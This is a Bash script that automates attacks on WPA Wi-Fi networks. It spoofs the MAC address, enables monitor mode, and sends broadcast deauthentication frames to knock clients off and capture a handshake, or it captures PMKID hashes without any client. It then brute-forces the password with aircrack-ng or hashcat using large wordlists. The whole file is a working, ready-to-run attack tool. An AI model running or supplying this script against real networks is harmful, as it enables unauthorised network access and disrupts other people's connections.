#!/bin/bash

# Colors
declare -r greenColor="\e[0;32m\033[1m"
declare -r endColor="\033[0m\e[0m"
declare -r redColor="\e[0;31m\033[1m"
declare -r blueColor="\e[0;34m\033[1m"
declare -r yellowColor="\e[0;33m\033[1m"
declare -r purpleColor="\e[0;35m\033[1m"
declare -r turquoiseColor="\e[0;36m\033[1m"
declare -r grayColor="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

# Capture control c
trap ctrl_c INT

function ctrl_c (){
    clear; echo -e "${redColor} [!] Exiting...${endColor}"
    sudo airmon-ng stop $networkCard > /dev/null 2>&1
    sleep 2; exit 1; tput cnorm
}

# Functions
# Help panel
function helpPanel(){
    echo -e "${yellowColor}"
    echo -e "\n[*] Script use"
    for i in {0..80}; do echo -en "-"; done
    echo -e "${endColor}"
    echo -e "\n\t${purpleColor}[-a]${endColor}${blueColor} Attack mode:\tHandshake${endColor}"
    echo -e "\t\t\t\t${blueColor}PKMID${endColor}"
    echo -e "\n\t${purpleColor}[-n]${endColor}${blueColor} Insert network card name${endColor}"
    echo -e "\n\t${purpleColor}[-h]${endColor}${blueColor} Open the help panel${endColor}"

    exit 0; tput cnorm
}
# Checking dependencies
function dependencies(){
    tput civis; clear
    programs=(aircrack-ng macchanger)
    echo '' > dependencies.tmp
    echo -e "${yellowColor} [*] Checking dependencies...${endColor}\n"

    for program in "${programs[@]}"; do
        echo -e "${blueColor}     > $program tool${endColor}"
        sleep 1

        test -f /usr/bin/$program
        if [ "$(echo $?)" == "0" ]; then
            echo ''${greenColor}'     > '${program}' tool'${endColor}'' >> dependencies.tmp
        else
            echo ''${redColor}'     > '${program}' tool'${endColor}''${blueColor}' installing...'${endColor}'' >> dependencies.tmp
            apt-get install $program -y > /dev/null 2>&1
        fi
    done; clear

    echo -e "${yellowColor} [*] Checking dependencies...${endColor}"
    echo -e "$(cat dependencies.tmp)"
    rm dependencies.tmp

    sleep 2
    tput cnorm
}
# Configuring network card
function configuringCard (){

        airmon-ng start $networkCard > /dev/null 2>&1

        while [ "$(echo $?)" != "0" ]; do
            clear; echo -e ''${redColor}' [!] The network card not exist'${endColor}''
            echo -en "\n${blueColor}     > Insert a correct name: ${endColor}" && read networkCard
            airmon-ng start $networkCard > /dev/null 2>&1
        done

    clear
    echo -e "${yellowColor} [*] Configuring network card...${endColor}"
    ifconfig $networkCard down && macchanger -a $networkCard > /dev/null 2>&1
    ifconfig $networkCard up; killall dhclient wpa_supplicant 2>/dev/null
    echo -e "${greenColor}\n     New mac direction: $(macchanger -s $networkCard | grep -i 'current' | xargs | cut -d ' ' -f '3-100')${endcolor}" 2>/dev/null
    sleep 2
}
function wordlists (){
    while true; do
        echo -e "${yellowColor} [*] Choise a wordlists${endcolor}"
        echo -e "${blueColor}     1 > Kaonashi ${endcolor}"
        echo -e "${blueColor}     2 > Rockyou ${endcolor}"
        echo -e "${blueColor}     3 > Kaonashi 100M ${endcolor}"
        echo -e "${blueColor}     4 > Kaonashi 14M ${endcolor}"
        echo -en "\n${grayColor}     > Select (1-2-3-4): ${endcolor}" && read select

        if [ "$(echo $select)" == "1" ]; then pack=/usr/share/wordlists/Kaonashi/wordlists/kaonashi.txt; break
        elif [ "$(echo $select)" == "2" ];then pack=/usr/share/wordlists/rockyou.txt; break
        elif [ "$(echo $select)" == "3" ];then pack=/usr/share/wordlists/Kaonashi/wordlists/kaonashiWPA100M.txt; break
        elif [ "$(echo $select)" == "4" ];then pack=/usr/share/wordlists/Kaonashi/wordlists/kaonashi14M.txt; break
        else clear; echo -e "${redColor} [!] Option not exits\n${endcolor}"
        fi
    done
}
# Attack modes
function startAttack (){

# Handshake attack
    if [ "$(echo $attack_mode)" == Handshake ]; then

        configuringCard

        xterm -bg "#875fff" -fg "#afafff" -hold -e "airodump-ng $networkCard" > /dev/null 2>&1 &
        airodump_xterm_PID=$!
        echo -en "\n${blueColor}     > Insert the ESSID: ${endcolor}" && read apESSID
        echo -en "${blueColor}     > Insert the Channel(CH): ${endcolor}" && read apChannel

        kill -9 $airodump_xterm_PID
        wait $airodump_xterm_PID 2>/dev/null

        xterm -bg "#875fff" -fg "#afafff" -hold -e "airodump-ng -c $apChannel -w Capture --essid $apESSID $networkCard" &
        airodump_filter_xterm_PID=$!

        sleep 5; xterm -bg "#875fff" -fg "#afafff" -hold -e "aireplay-ng -0 10 -e $apESSID -c FF:FF:FF:FF:FF:FF $networkCard" &
        aireplay_xterm_PID=$!

        sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
        sleep 10; kill -9 $airodump_filter_xterm_PID; wait $airodump_filter_xterm_PID 2>/dev/null

        wordlists
        #xterm -bg "#875fff" -fg "#afafff" -hold -e "aircrack-ng -w $pack Capture-01.cap" &
        xterm -bg "#875fff" -fg "#afafff" -hold -e "aircrack-ng -w /usr/share/wordlists/Kaonashi/wordlists/kaonashi.txt Capture-01.cap" &

# PKMID attack
    elif [ "$(echo $attack_mode)" == "PKMID" ]; then

        configuringCard

        clear; echo -e "${yellowColor} [*] ClientLess PKMID Attack...${endColor}\n"; sleep 2
        timeout 60 bash -c "hcxdumptool -i $networkCard --enable_status=1 -o Capture"
        echo -e "${yellowColor} [*] Obteniendo hashes...${endColor}\n"; sleep 2
        hcxpcaptool -z myHashes Capture; rm Capture 2>/dev/null

        test -f myHashes

        wordlists
        if [ "$(echo $?)" == "0" ]; then
            echo -e "${yellowColor}     > Iniciando proceso de fuerza bruta...${endColor}"
            hashcat -m 16800 myHashes $pack -d 1 --force
        else
            echo -e "${redColor} [!] failed to capture the required packet ${endColor}"
            rm Capture; sleep 2
        fi

# Invalid attack mode
    else
        clear; echo -e "${redColor} [!] Invalid attack attack_mode${endcolor}"
        echo -en "\n${blueColor}     > Write Handshake or PKMID: ${endcolor}" && read attack_mode
        startAttack $attack_mode
    fi

}
# Main and parameters
if [ "$(id -u)" == "0" ]; then
    parameter_counter=0; while getopts 'a:n:h' arg; do

        case $arg in
            a) attack_mode=$OPTARG; let parameter_counter+=1;;
            n) networkCard=$OPTARG; let parameter_counter+=1;;
            h) helpPanel;;
        esac

    done
    if [ "$parameter_counter" == 2 ];then
        dependencies
        startAttack
        tput cnorm; airmon-ng stop $networkCard > /dev/null 2>&1
    else
        helpPanel
        #wordlists
    fi
else
    echo -e "${redColor}\n[!] You are not root${endColor}"
fi
